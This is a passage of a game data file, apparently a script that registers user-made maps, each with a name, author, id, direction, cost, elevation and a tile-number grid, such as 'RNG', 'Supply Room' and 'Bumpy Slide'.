,11,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,11,11,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0]});
maps.push({name="Budget Frostdrake",author="FrostdrakeReady",id="#1661872546",direction="forward",cost=243,elevation=0,map=[0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,25,25,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,25,25,25,25,25,25,85,85,0,0,0,0,0,0,0,0,0,0,0,0,25,25,25,25,25,25,25,25,0,0,0,0,0,0,0,1,1,1,1,1,1,1,1,1,1,1,26,26,0,0,0,0,0,0,38,38,39,40,41,42,43,24,92,38,38,1,27,27,0,0,0,0,0,0,38,1,1,1,1,1,1,1,38,38,38,1,28,28,0,0,0,0,0,0,90,1,99,25,25,25,25,25,1,90,90,1,29,29,0,0,0,0,0,0,38,1,1,1,1,1,1,3,1,38,38,1,30,30,0,0,0,0,0,0,38,1,1,44,44,44,44,24,1,37,37,1,31,31,0,0,0,0,0,0,38,1,44,44,44,44,44,44,44,116,116,1,32,32,0,0,0,44,44,44,58,44,90,44,44,1,98,98,44,115,115,1,33,33,0,0,0,44,85,44,58,44,44,44,1,0,0,0,1,114,114,96,34,34,0,0,0,44,0,0,38,1,1,1,1,0,0,0,1,1,1,1,34,34,0,34,0,44,0,0,38,38,1,0,0,0,0,0,0,0,1,1,19,1,0,34,0,44,1,1,1,38,1,0,0,0,135,135,0,0,1,93,3,1,1,1,34,44,124,3,118,38,1,0,0,0,135,135,0,0,1,97,34,1,1,1,0,0,1,1,1,0,1,0,0,0,25,25,0,0,1,0,34,1,1,1,34,0,41,93,41,0,1,0,0,0,2,2,0,0,1,0,0,34,0,34,85]});
maps.push({name="RNG",author="tilgep",id="#1661884041",direction="forward",cost=225,elevation=0,map=[0,0,15,2,2,15,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,15,15,15,15,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,15,15,15,15,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,15,15,15,15,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,15,15,15,15,0,0,0,0,0,0,0,1,1,1,1,1,1,0,0,0,15,15,15,15,1,0,0,0,0,0,1,15,15,15,15,15,15,1,0,0,15,15,15,15,1,1,0,0,0,0,1,15,132,132,132,132,15,1,0,0,15,15,15,15,15,15,15,15,15,15,15,15,132,132,132,132,15,1,0,0,15,15,15,15,15,15,15,15,15,15,15,15,132,132,132,132,15,1,0,0,15,15,15,15,15,15,15,15,15,15,15,15,15,15,15,15,15,1,0,0,15,15,15,15,15,15,15,15,15,15,15,15,15,15,15,1,1,0,0,0,0,0,0,0,0,15,15,15,15,1,1,1,15,131,15,1,0,0,0,0,0,0,0,0,0,15,15,15,15,0,0,1,15,15,15,1,0,0,0,0,0,0,0,0,0,15,15,15,15,0,0,0,1,0,0,0,1,0,0,0,0,0,0,0,0,15,15,15,15,0,0,0,0,0,0,1,132,1,0,0,0,0,0,0,0,15,15,15,15,0,0,0,0,0,0,1,14,1,0,0,0,0,0,0,0,15,134,15,15,0,0,0,0,0,0,0,97,1,0,0,0,0,0,0,0,96,96,96,96,0,0,0,0,0,0,96,96,1,0,0,0,0,0,0,96,15,15,15,15,96,0,0,0,0,0,0,133,1,0,0,0,0,0,0,0,15,2,2,15,0,0,0,0,0,0,0,1,0]});
maps.push({name="defend or skill",author="blasian",id="#1661898835",direction="right",cost=230,elevation=-2,map=[0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,94,14,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,96,96,14,90,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,131,96,14,14,0,0,0,0,0,0,12,12,12,0,0,90,12,12,93,0,96,96,90,14,0,0,0,0,0,0,12,134,12,12,12,12,12,90,12,2,0,1,135,135,1,0,0,0,0,0,12,12,12,90,12,12,12,12,12,2,0,1,135,135,1,0,0,0,0,0,12,12,12,0,0,90,12,12,93,0,0,1,135,135,1,0,0,0,0,0,0,130,130,0,0,0,0,0,0,0,0,1,135,135,1,0,0,0,0,0,0,130,130,0,0,0,0,0,0,0,0,1,135,135,1,0,0,0,0,0,0,130,130,0,0,0,0,0,0,0,0,1,135,135,1,0,0,0,0,0,0,130,130,0,0,0,0,0,0,0,0,1,135,135,1,0,0,0,0,0,0,130,130,0,0,0,0,0,0,0,0,1,135,135,1,1,1,1,14,97,14,130,130,0,0,0,0,0,0,0,0,1,135,135,135,135,135,135,94,14,14,14,14,1,1,1,1,1,0,0,0,1,135,135,135,135,135,135,14,132,14,14,14,91,91,91,133,1,0,0,0,1,1,1,1,1,1,1,94,14,14,90,14,1,1,1,1,1,0,0,0,0,0,0,0,0,0,0,1,14,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,93,1,0,0,0,0,0,0,0,0,0]});
maps.push({name="split",author="blasian",id="#1661899196",direction="forward",cost=190,elevation=0,map=[0,0,0,0,1,1,1,1,2,2,1,1,1,1,0,0,0,0,0,0,0,0,0,0,1,94,3,14,14,14,14,3,94,1,0,0,0,0,0,0,0,0,0,0,1,19,0,0,14,14,0,0,19,1,0,0,0,0,0,0,0,0,0,0,1,19,0,0,14,14,0,0,19,1,0,0,0,0,0,0,0,0,0,0,1,19,0,0,14,14,0,0,19,1,0,0,0,0,0,0,0,0,0,0,1,19,0,0,14,14,0,0,19,1,0,0,0,0,0,0,0,0,0,0,1,19,3,14,94,94,14,3,19,1,0,0,0,0,0,0,0,0,0,0,1,19,0,1,14,14,1,0,19,1,0,0,0,0,0,0,0,0,0,0,1,19,0,1,14,14,1,0,19,1,0,0,0,0,0,0,131,19,93,19,19,19,3,14,14,14,14,3,19,19,19,93,19,131,0,0,0,0,0,0,1,19,0,1,14,14,1,0,19,1,0,0,0,0,0,0,0,0,0,0,1,19,0,1,132,132,1,0,19,1,0,0,0,0,0,0,0,0,0,0,1,19,0,1,14,14,1,0,19,1,0,0,0,0,0,0,0,0,0,0,1,19,3,14,14,14,14,3,19,1,0,0,0,0,0,0,0,0,0,0,1,19,0,1,14,14,1,0,19,1,0,0,0,0,0,0,0,0,0,0,1,19,0,1,14,14,1,0,19,1,0,0,0,0,0,0,0,0,0,0,1,100,0,1,14,14,1,0,100,1,0,0,0,0,0,0,0,0,0,0,1,19,0,1,134,134,1,0,19,1,0,0,0,0,0,0,0,0,0,0,1,19,0,0,14,14,0,0,19,1,0,0,0,0,0,0,0,0,0,0,1,93,133,0,2,2,0,133,93,1,0,0,0,0,0,0]});
maps.push({name="Gamba",author="blasian",id="#1661900188",direction="forward",cost=230,elevation=0,map=[0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,54,54,0,0,0,0,0,0,0,0,0,0,0,133,14,14,0,0,0,0,54,54,0,0,0,0,0,0,14,14,133,0,0,0,93,14,94,0,0,0,54,54,0,0,0,0,54,94,14,93,0,0,0,0,100,132,14,54,0,0,54,54,0,0,0,0,54,14,132,100,0,0,0,0,93,14,94,54,0,0,54,54,0,0,0,0,54,94,14,93,0,0,0,136,14,14,0,54,0,0,54,54,0,0,0,0,54,0,14,14,136,0,0,0,0,0,0,54,0,0,131,131,0,0,0,0,54,0,0,0,0,0,0,0,0,0,54,54,0,0,0,0,0,0,0,0,54,0,0,0,0,0,0,0,0,0,54,1,1,1,1,1,1,1,1,0,54,0,0,0,0,0,0,0,0,0,54,1,134,14,54,54,14,134,1,0,54,0,0,0,0,0,0,0,0,0,54,1,1,1,54,54,1,1,1,0,54,0,0,0,0,0,0,0,0,0,54,1,1,1,54,54,1,1,1,0,54,0,0,0,0,0,0,0,0,0,54,1,137,14,54,54,14,137,1,0,54,0,14,14,136,0,0,133,14,14,54,1,1,1,54,54,1,1,1,0,54,94,14,93,0,0,0,0,93,14,94,1,1,1,54,54,1,1,1,0,54,14,132,100,0,0,0,0,100,132,14,1,139,14,54,54,14,139,1,0,54,94,14,93,0,0,0,0,93,14,94,1,1,1,95,95,1,1,1,0,54,0,14,14,138,0,0,138,14,14,54,54,54,95,54,54,95,54,54,54,54,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="SNES Ghost Valley 1",author="TF2 Pencil",id="#1661928716",direction="forward",cost=183,elevation=3,map=[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0,28,28,28,28,28,28,28,28,125,28,28,28,28,28,0,0,0,25,25,0,28,28,28,28,28,28,28,28,28,28,28,28,28,28,0,0,0,25,25,0,28,28,28,28,28,28,28,28,125,28,28,28,28,28,0,0,0,25,25,0,28,28,0,0,0,0,0,0,0,0,0,0,28,28,0,0,25,25,25,0,28,28,0,0,0,0,0,0,0,0,0,0,28,28,0,0,25,131,25,0,28,28,0,0,0,0,0,0,0,0,0,0,28,28,0,0,25,25,25,0,0,28,28,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,28,28,28,0,0,0,0,0,0,0,0,28,28,0,0,0,0,0,0,0,0,28,28,0,0,0,0,0,0,0,0,28,28,0,0,0,0,0,0,0,0,28,28,0,0,0,0,0,0,0,0,28,28,28,28,28,28,0,0,0,28,28,28,0,0,0,0,0,0,0,0,28,28,28,28,28,28,0,0,28,28,28,0,0,0,0,0,0,0,0,0,0,0,0,0,28,28,0,0,28,28,0,0,0,0,28,28,28,1,0,0,0,0,0,0,28,28,0,0,28,28,0,0,0,0,28,132,28,1,0,0,28,0,0,0,28,28,0,0,28,28,0,0,0,0,28,28,28,1,0,0,28,0,0,0,28,28,0,0,28,28,28,28,28,28,28,28,28,1,28,28,28,28,28,28,28,28,0,0,28,28,28,28,28,28,28,28,28,1,28,28,28,28,28,28,28,28,0,0,0,0,0,0,0,0,0,0,0,1,95,95,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,2,2,0,0,0,0,0,0,0]});
maps.push({name="Elevator Escape",author="KizanFlandre",id="#1661930561",direction="forward",cost=100,elevation=19,map=[0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,105,105,105,105,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,105,105,105,105,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,105,105,105,105,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,105,92,92,105,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,110,110,110,110,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,110,110,110,110,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,110,110,110,110,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,110,92,92,110,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,115,115,115,115,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,115,115,115,115,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,115,115,115,115,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,115,92,92,115,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,120,120,120,120,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,120,120,120,120,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,120,120,120,120,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,120,92,92,120,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,124,124,124,124,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,124,124,124,124,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0]});
maps.push({name="GoGoShooter Baguette",author="mangaka7",id="#1661986141",direction="left",cost=414,elevation=0,map=[0,0,0,0,0,0,0,0,0,0,0,0,105,105,2,2,105,0,0,0,0,0,0,0,0,0,0,0,0,0,0,105,77,56,56,56,56,105,0,0,0,0,0,0,0,0,0,0,0,105,105,56,77,77,56,56,56,105,0,0,0,0,0,0,0,0,0,0,105,77,56,91,89,77,77,56,56,105,0,0,0,0,0,0,0,0,0,105,56,77,77,56,91,89,77,56,56,56,105,0,0,0,0,0,0,0,105,91,56,89,89,77,91,91,77,77,56,56,105,0,0,0,0,0,0,105,77,56,91,56,89,77,56,91,89,77,56,56,105,0,0,0,0,0,105,56,77,77,56,91,89,77,56,91,89,77,56,105,0,0,0,0,0,105,91,89,89,77,56,91,89,77,77,91,89,77,56,105,0,0,0,0,105,56,56,91,89,77,77,56,91,89,77,56,91,77,105,0,0,0,0,0,105,77,77,56,91,89,77,56,91,89,77,56,56,105,0,0,0,0,0,105,56,89,77,77,91,89,77,56,56,91,77,56,56,105,0,0,0,0,0,105,56,56,56,77,91,89,77,56,56,91,77,77,105,0,0,0,0,0,105,56,91,56,89,77,91,89,77,77,56,56,91,105,0,70,70,70,70,0,105,56,56,91,89,77,56,91,56,77,77,56,105,0,0,70,70,70,70,0,105,56,56,91,89,77,77,56,91,89,77,105,0,0,0,0,0,0,0,0,2,56,56,91,56,89,77,56,91,56,105,0,0,0,0,0,0,0,0,0,2,56,56,56,91,89,77,77,56,105,0,0,0,0,0,76,76,76,76,0,105,56,56,56,56,91,56,105,105,0,0,0,0,0,0,76,76,76,76,0,0,105,105,105,105,105,105,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="Akala2 Waiting Room",author="ZpLit",id="#1661997650",direction="forward",cost=92,elevation=-2,map=[0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,13,13,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,90,0,0,0,0,90,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,90,0,0,90,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,90,0,0,0,0,90,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,95,95,95,95,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,16,111,111,111,111,16,0,0,0,0,0,0,0,0,0,0,0,0,0,0,16,90,51,90,51,16,0,0,0,0,0,0,0,0,0,0,0,0,0,0,16,51,90,51,90,16,0,0,0,0,0,0,0,0,0,0,0,0,0,0,16,90,51,90,51,16,0,0,0,0,0,0,0,0,0,0,0,0,0,0,16,51,90,51,90,16,0,0,0,0,0,0,0,0,0,0,0,0,0,0,16,90,51,90,51,16,0,0,0,0,0,0,0,0,0,0,0,0,0,0,16,51,51,51,51,16,0,0,0,0,0,0,0,0,0,0,0,0,0,0,16,88,2,2,88,16,0,0,0,0,0,0,0]});
maps.push({name="Rem",author="mangaka7",id="#1661998615",direction="forward",cost=499,elevation=4,map=[0,0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,66,66,66,66,66,66,60,60,60,60,0,0,0,0,0,0,0,0,0,66,65,65,65,65,65,65,65,65,64,64,60,0,0,0,0,0,0,0,66,65,65,66,66,66,66,66,66,66,64,64,64,60,0,0,0,0,0,66,65,65,65,65,65,65,65,65,65,65,75,64,64,64,60,0,0,0,0,66,65,65,66,66,66,66,66,66,66,66,75,64,64,64,64,60,0,0,66,65,66,66,65,65,65,65,65,65,65,65,75,64,64,64,64,60,0,0,66,65,65,65,65,65,65,65,65,65,65,65,64,64,64,64,64,64,60,0,66,65,65,65,65,65,65,65,65,65,65,65,64,64,64,64,64,64,60,0,66,65,65,65,66,66,66,66,66,66,66,66,64,64,64,81,64,64,60,0,66,65,66,66,65,65,65,65,65,65,65,65,64,64,64,81,64,64,60,0,66,65,65,65,65,65,64,64,64,64,64,64,64,64,64,81,64,64,60,0,66,65,65,65,65,64,64,64,64,64,64,64,64,64,64,64,64,64,60,0,66,65,66,66,65,64,64,64,64,70,0,64,64,64,64,64,64,64,60,0,66,65,65,65,66,65,64,64,70,0,71,71,75,64,64,64,64,60,0,0,0,66,65,86,65,86,64,64,70,73,100,71,75,64,64,64,64,60,0,0,0,66,65,65,86,65,66,64,70,73,71,71,75,64,64,64,60,0,0,0,0,0,66,86,65,86,65,66,64,70,0,64,64,64,64,60,0,0,0,0,0,0,0,66,65,65,86,65,66,64,64,64,64,64,60,0,0,0,0,0,0,0,0,0,2,2,65,65,66,65,60,60,60,60,0,0,0,0,0,0]});
maps.push({name="Supply Room",author="TF2 Pencil",id="#1662005941",direction="forward",cost=265,elevation=0,map=[0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,15,15,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,15,15,1,1,1,1,1,1,1,0,0,0,0,1,1,1,1,1,1,1,15,15,4,22,15,15,22,22,1,0,0,0,0,1,15,15,15,15,15,96,15,15,15,15,15,15,15,22,1,0,0,0,0,1,15,93,15,93,15,96,15,15,15,15,15,15,15,15,1,0,0,0,0,1,15,15,93,15,15,96,15,15,1,19,3,15,15,22,1,0,0,0,0,1,15,93,15,93,15,96,15,15,1,19,15,15,15,15,1,0,0,0,0,1,15,15,15,15,15,96,15,15,1,15,15,15,15,15,1,0,0,0,0,1,1,1,1,1,1,1,15,15,1,19,15,15,15,22,1,0,0,0,0,0,0,0,0,0,0,1,15,15,1,15,15,15,15,15,1,0,0,0,0,1,1,1,1,1,1,1,15,15,1,19,15,15,15,15,1,0,0,0,0,1,15,15,15,15,15,15,15,15,1,15,15,15,15,22,1,0,0,0,0,1,15,94,15,94,15,15,15,15,1,19,15,15,15,15,1,0,0,0,0,1,15,15,15,15,15,15,15,15,1,15,15,15,15,15,1,0,0,0,0,1,15,94,15,94,15,15,15,15,1,19,19,15,22,22,1,0,0,0,0,1,15,15,15,15,15,15,15,15,1,100,19,15,22,97,1,0,0,0,0,1,1,1,1,1,1,1,15,15,1,1,1,1,1,1,1,0,0,0,0,0,0,0,0,0,0,0,15,15,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0]});
maps.push({name="UPRAMPS",author="TF2 Pencil",id="#1662006117",direction="forward",cost=181,elevation=18,map=[0,0,0,0,0,0,0,0,0,0,0,0,97,25,0,0,0,0,2,2,40,40,39,38,37,37,0,41,40,39,0,0,25,25,0,0,0,0,6,6,40,40,39,38,37,37,0,41,40,39,0,0,26,26,0,0,0,0,6,6,41,41,0,0,0,0,0,0,0,38,0,0,27,27,0,0,0,0,6,6,42,42,0,0,0,0,0,36,36,37,0,0,28,28,0,0,0,0,6,6,0,0,0,0,0,0,0,36,36,37,0,0,29,29,0,0,0,0,6,6,39,39,40,41,41,0,0,36,0,0,0,0,0,0,0,0,0,0,0,0,39,39,40,41,41,0,0,35,0,0,0,30,30,29,29,0,0,0,26,26,40,0,0,42,42,0,0,35,0,0,0,30,30,29,29,0,0,0,27,27,41,0,0,43,43,0,0,35,0,0,0,31,31,0,0,0,0,0,28,28,42,0,0,0,0,0,0,34,0,0,0,31,31,0,0,0,0,0,29,29,43,0,0,39,39,0,0,34,0,0,0,0,0,0,0,0,0,0,0,0,44,0,0,39,39,0,0,33,0,0,0,32,32,0,31,30,29,28,27,27,0,0,0,40,40,0,0,33,0,0,0,32,32,0,31,30,29,28,27,27,0,0,0,41,41,0,0,0,0,0,0,33,33,0,0,0,0,0,28,28,44,44,43,42,42,0,0,14,14,96,14,34,34,0,0,0,0,0,29,29,44,44,43,42,42,0,0,14,14,96,14,34,34,0,0,0,0,0,30,30,24,24,0,0,0,0,0,0,0,0,0,33,33,0,35,34,33,32,31,31,24,24,0,0,0,0,0,0,0,0,0,33,33,0,35,34,33,32,31,31,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="One Side Than Two",author="TF2 Pencil",id="#1662006286",direction="forward",cost=308,elevation=0,map=[17,17,1,1,1,1,1,1,1,1,0,0,0,0,0,0,0,0,2,2,17,17,66,68,68,68,66,66,66,1,0,0,0,0,0,0,0,0,17,17,17,17,66,1,1,1,66,66,66,1,0,0,0,0,0,0,0,0,17,17,17,17,66,66,66,66,66,66,66,1,0,0,0,0,0,0,0,0,17,17,17,17,1,1,1,1,68,1,66,1,0,0,0,0,0,0,0,0,17,17,17,17,0,0,0,1,68,1,66,1,0,0,0,0,0,17,17,17,17,17,17,17,0,0,0,1,68,1,66,1,0,0,0,0,0,17,132,17,17,17,17,17,0,0,0,1,66,66,66,1,0,0,0,0,0,17,17,17,17,17,17,17,0,0,0,1,17,139,17,1,0,0,0,0,0,17,17,17,17,17,17,17,0,0,0,1,17,17,17,1,0,0,0,0,0,1,17,1,17,1,17,17,0,0,0,1,1,1,1,1,0,0,0,0,0,1,131,1,133,1,17,17,0,0,0,17,136,1,138,17,0,0,0,0,0,1,1,1,1,1,17,17,0,0,0,17,17,1,17,17,0,0,0,0,0,1,17,17,17,1,17,17,0,0,0,17,17,1,17,17,0,0,0,0,0,1,17,134,17,1,17,17,0,0,0,17,17,17,17,17,0,0,0,0,0,1,17,17,17,1,17,17,0,0,0,17,17,17,17,17,17,1,1,1,1,1,17,17,17,1,17,17,0,0,0,17,17,17,17,17,17,1,136,17,17,17,17,17,17,1,17,17,0,0,0,17,17,17,17,137,17,1,1,1,17,17,17,17,17,1,17,17,0,0,0,17,17,17,17,17,17,1,133,17,17,17,17,17,17,1,2,2,0,0,0,17,17,17,17,17,17,1,1,1,1,1,1,1,1,1]});
maps.push({name="SNES Rainbow Road",author="TF2 Pencil",id="#1662050164",direction="forward",cost=172,elevation=6,map=[0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,38,38,1,1,1,1,1,1,0,0,0,0,0,0,0,0,0,38,38,38,38,38,1,38,38,38,38,38,38,38,38,38,38,38,0,0,0,38,38,38,38,38,1,38,38,38,38,38,38,38,38,38,38,38,0,0,0,38,38,0,0,0,1,131,38,100,38,1,0,0,0,0,0,38,0,0,0,38,38,0,0,0,1,1,1,1,1,1,0,0,0,0,0,38,0,0,0,38,38,0,0,0,0,0,0,0,0,0,0,0,0,0,38,38,38,0,0,38,38,0,0,0,38,38,38,38,38,38,0,0,0,0,38,0,38,0,0,38,38,0,0,0,38,38,38,38,38,38,0,0,0,0,38,0,38,0,0,38,38,0,0,0,38,38,0,0,0,38,0,0,0,0,38,126,38,0,0,38,38,0,0,0,38,38,0,0,0,38,0,0,0,0,38,38,38,0,0,38,38,0,0,0,38,38,0,0,0,38,0,0,0,0,0,38,0,0,0,38,38,38,38,38,38,38,0,0,0,38,0,0,0,0,0,38,0,0,0,38,38,38,38,38,38,38,0,0,0,38,0,0,0,0,0,38,0,0,0,0,0,0,0,0,0,0,0,0,0,38,0,0,0,0,0,38,0,0,0,0,0,0,0,44,44,44,0,0,0,38,0,0,0,0,0,38,0,0,0,44,44,44,44,44,132,44,0,0,0,38,0,0,0,0,0,38,0,0,0,44,44,0,0,44,44,44,0,0,0,38,38,38,38,38,38,38,0,0,0,44,44,0,0,0,0,0,0,0,0,38,38,38,38,38,38,38,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="Uphills",author="TF2 Pencil",id="#1662050224",direction="forward",cost=182,elevation=19,map=[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,10,10,10,10,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,10,66,66,40,39,38,37,36,35,34,33,32,32,32,0,0,0,0,5,5,10,66,66,40,39,38,37,36,35,34,33,32,32,32,0,0,0,0,5,5,10,66,66,10,0,0,0,0,0,0,0,0,31,31,0,0,0,0,5,5,10,66,66,10,0,0,0,0,0,0,0,0,30,30,0,0,0,0,5,5,10,66,66,10,0,0,0,0,0,0,0,0,29,29,0,0,0,0,5,5,10,66,66,110,110,111,112,113,113,0,0,0,29,29,0,0,0,0,6,6,10,66,66,110,110,111,112,113,113,0,0,0,0,0,0,0,0,0,7,7,10,10,10,10,0,0,0,114,115,0,0,0,34,34,0,0,0,0,8,8,0,0,0,0,0,0,0,115,115,0,0,0,0,0,0,0,0,0,9,9,0,0,0,0,0,0,0,116,116,0,0,0,34,34,0,0,0,0,10,10,0,122,122,121,120,119,118,117,117,0,0,0,34,34,0,0,0,0,11,11,0,122,122,121,120,119,118,117,117,0,0,0,33,33,0,0,0,0,12,12,0,123,123,0,0,0,0,0,0,0,0,0,32,32,0,0,0,0,13,13,0,124,124,0,0,0,0,0,0,0,0,0,31,31,0,0,0,0,14,14,0,24,24,0,0,0,0,0,0,0,0,0,30,30,0,0,0,0,0,0,0,24,24,0,0,0,0,0,0,0,0,0,29,29,30,0,32,32,32,32,0,24,24,0,0,0,0,0,0,0,0,0,29,29,30,0,32,32,32,32,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="My Butt",author="Shellbert",id="#1662070743",direction="forward",cost=563,elevation=-2,map=[0,0,0,0,0,0,0,1,1,1,2,2,1,1,1,1,1,0,0,0,0,0,0,0,1,1,1,1,64,64,64,64,64,64,64,62,62,1,1,1,0,0,0,1,1,72,72,1,1,62,64,64,1,64,62,62,62,62,94,94,0,Vector(249,249,250),1,72,72,72,74,74,1,1,62,62,62,1,62,62,62,62,94,94,0,1,1,72,74,74,74,74,74,74,1,62,62,1,62,62,62,62,94,94,1,1,74,74,74,74,74,74,74,74,74,91,62,1,62,62,62,62,94,94,1,74,74,74,74,70,70,70,70,70,74,70,91,91,62,62,62,62,94,94,74,74,74,74,70,70,70,74,74,70,70,70,70,70,1,1,62,62,94,94,74,74,74,70,70,74,74,74,74,74,74,70,70,70,1,0,1,1,1,1,70,74,74,70,74,74,74,74,1,1,1,91,91,91,1,0,1,62,93,93,70,70,74,74,74,74,1,1,1,62,62,62,62,1,1,1,62,62,93,93,70,74,74,74,1,1,1,64,64,62,62,62,62,1,62,62,62,62,93,93,74,74,74,1,1,64,64,64,64,64,62,62,62,1,62,62,62,62,93,93,74,74,1,1,64,64,64,64,64,64,62,62,62,1,62,62,62,62,93,93,74,74,1,64,64,64,64,64,64,64,62,62,1,62,62,62,62,62,93,93,74,70,1,64,64,64,64,64,64,62,62,62,62,62,62,62,62,62,93,93,70,70,1,64,64,64,64,64,62,62,62,62,62,62,62,62,62,62,93,93,70,70,70,1,64,64,62,62,62,62,62,62,62,62,62,62,62,62,1,1,1,1,1,1,1,1,62,62,62,62,62,62,62,62,62,62,1,1,0,0,0,0,0,0,0,1,1,2,2,1,1,1,1,1,1,1,1,0,0,0]});
maps.push({name="Bumpy Slide",author="MoistNoodlez",id="#1662073754",direction="right",cost=212,elevation=-17,map=[0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,24,24,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,127,127,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,24,135,135,24,0,0,0,0,0,0,0,0,0,0,7,7,7,7,0,0,24,135,135,24,0,0,0,0,0,0,0,0,0,0,7,135,135,2,0,0,23,135,135,23,0,0,0,0,0,0,0,0,0,0,7,135,135,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,7,135,135,7,0,0,21,135,135,21,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,20,135,135,20,0,0,0,0,0,0,0,0,0,0,11,135,135,11,0,0,19,135,135,19,0,0,0,0,0,0,0,0,0,0,10,135,135,10,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,9,135,135,9,0,0,17,135,135,17,0,0,0,0,0,0,0,0,0,0,8,135,135,8,0,0,16,135,135,16,0,0,0,0,0,0,0,0,0,0,7,135,135,7,0,0,15,135,135,15,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,9,135,135,9,0,0,14,135,135,14,0,12,11,10,0,9,10,11,0,9,9,135,135,9,0,0,14,135,135,135,0,135,135,135,0,135,135,135,0,135,135,135,135,9,0,0,14,135,135,135,0,135,135,135,0,135,135,135,0,135,135,135,135,9,0,0,14,14,14,14,0,12,11,10,0,9,10,11,0,9,9,9,9,9,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
